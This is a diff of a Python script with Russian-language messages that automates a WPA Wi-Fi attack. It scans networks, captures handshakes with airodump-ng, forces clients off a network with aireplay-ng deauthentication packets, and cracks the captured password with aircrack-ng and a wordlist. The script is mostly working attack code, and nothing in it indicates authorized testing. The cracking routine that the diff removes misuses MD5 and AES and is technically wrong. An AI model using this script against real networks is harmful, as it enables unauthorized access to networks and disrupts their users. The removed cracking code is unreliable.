@@ -2,10 +2,6 @@ import subprocess
 import time
 import sys
 import os
-import hashlib
-from binascii import hexlify
-from pycryptodome.Cipher import AES
-from pycryptodome.Util.Padding import pad
 from itertools import product
 import string
 
@@ -22,99 +18,67 @@ def disable_monitor_mode(interface):
 
 def capture_handshake(interface, target_bssid, output_file, channel, timeout):
     """Capture WPA handshake using airodump-ng."""
-    capture_process = subprocess.Popen([
-        "airodump-ng",
-        "--bssid", target_bssid,
-        "-c", channel,
-        "-w", output_file,
-        interface
-    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    try:
+        subprocess.run([
+            "airodump-ng",
+            "--bssid", target_bssid,
+            "-c", channel,
+            "-w", output_file,
+            interface
+        ], timeout=timeout, check=True)
+    except subprocess.TimeoutExpired:
+        print("Время ожидания истекло. Рукопожатие не захвачено.")
+        return None
 
-    start_time = time.time()
-    while True:
-        elapsed_time = time.time() - start_time
-        if elapsed_time > timeout:
-            capture_process.terminate()
-            return None
-
-        output = capture_process.stdout.readline()
-        if output and "WPA handshake" in output.decode():
-            capture_process.terminate()
-            return output_file
-
-        time.sleep(1)
+    if os.path.exists(f"{output_file}-01.cap"):
+        return f"{output_file}-01.cap"
+    return None
 
 
 def send_deauth_packets(interface, target_bssid, station_mac):
     """Send deauth packets to disconnect a client and capture the handshake."""
-    subprocess.run([
-        "aireplay-ng",
-        "--deauth", "10",
-        "-a", target_bssid,
-        "-c", station_mac,
-        interface
-    ], check=True)
+    try:
+        subprocess.run([
+            "aireplay-ng",
+            "--deauth", "10",
+            "-a", target_bssid,
+            "-c", station_mac,
+            interface
+        ], check=True)
+        time.sleep(5)  # Даем время для захвата рукопожатия
+    except subprocess.CalledProcessError as e:
+        print(f"Ошибка при отправке deauth-пакетов: {e}")
 
 
-def wpa_hcrack(password, ssid, eapol):
-    """Crack WPA hash using the provided password and eapol."""
-    key = password.encode("utf-8")
-    
-    hash1 = hashlib.md5(key).digest()
-    hash2 = hashlib.md5(hash1).digest()
-
-    cipher = AES.new(hash2, AES.MODE_CBC, iv=b"\0" * 16)
-    encrypted = cipher.encrypt(pad(eapol, AES.block_size))
-
-    return encrypted
-
-
-def crack_password_from_hccapx(hccapx_file, wordlist, rate_limit):
+def crack_password_from_hccapx(hccapx_file, wordlist):
     """Attempt to crack WPA password using a wordlist."""
-    with open(hccapx_file, "rb") as f:
-        eapol = f.read()
-
-    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
-    counter = 0
-    rate = rate_limit / 60.0
-
-    for length in range(8, 9):
-        for guess in product(charset, repeat=length):
-            password = ''.join(guess)
-            wpa_hcrack(password, "SSID_PLACEHOLDER", eapol)
-
-            counter += 1
-            if counter >= rate:
-                time.sleep(1)
+    try:
+        subprocess.run([
+            "aircrack-ng",
+            hccapx_file,
+            "-w", wordlist
+        ], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Ошибка при взломе пароля: {e}")
 
 
 def list_networks(interface):
     """List available networks using airodump-ng."""
     try:
-        # Run airodump-ng to scan networks in the background
-        process = subprocess.Popen(
-            ["airodump-ng", interface],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-
         print("Сканирование сетей...\n")
-        print("Сканирование активных сетей в реальном времени:")
+        subprocess.run([
+            "airodump-ng",
+            interface,
+            "--write", "scan_output",
+            "--output-format", "csv"
+        ], timeout=10, check=True)
 
-        while True:
-            output = process.stdout.readline()
-            if output:
-                print(output.strip())  # Print available networks
-
-            # Exit on user input (Ctrl+C)
-            if not output:
-                break
-            time.sleep(1)
-
-    except KeyboardInterrupt:
-        print("\nСканирование остановлено.")
-        process.terminate()
+        # Чтение и вывод результатов сканирования
+        with open("scan_output-01.csv", "r") as f:
+            for line in f:
+                print(line.strip())
+    except subprocess.TimeoutExpired:
+        print("Сканирование завершено.")
 
 
 def main():
@@ -123,7 +87,6 @@ def main():
 
     try:
         list_networks(interface)
-
     except KeyboardInterrupt:
         print("\nСканирование завершено.")
         disable_monitor_mode(interface)
@@ -136,7 +99,7 @@ def main():
     captured_file = capture_handshake(interface, target_bssid, output_file, channel, timeout=120)
 
     if captured_file is None:
-        print("Не удалось захватить хендшейк. Завершаем программу.")
+        print("Не удалось захватить рукопожатие. Завершаем программу.")
         disable_monitor_mode(interface)
         sys.exit(1)
 
@@ -146,10 +109,10 @@ def main():
         send_deauth_packets(interface, target_bssid, station_mac)
 
     wordlist_file = input("Введите путь к словарю паролей: ").strip()
-    crack_password_from_hccapx(captured_file + "-01.cap", wordlist_file, rate_limit=2000)
+    crack_password_from_hccapx(captured_file, wordlist_file)
 
     disable_monitor_mode(interface)
-    print(f"\nПерехват завершён. Проверьте файл: {captured_file}-01.cap")
+    print(f"\nПерехват завершён. Проверьте файл: {captured_file}")
 
 
 if __name__ == "__main__":
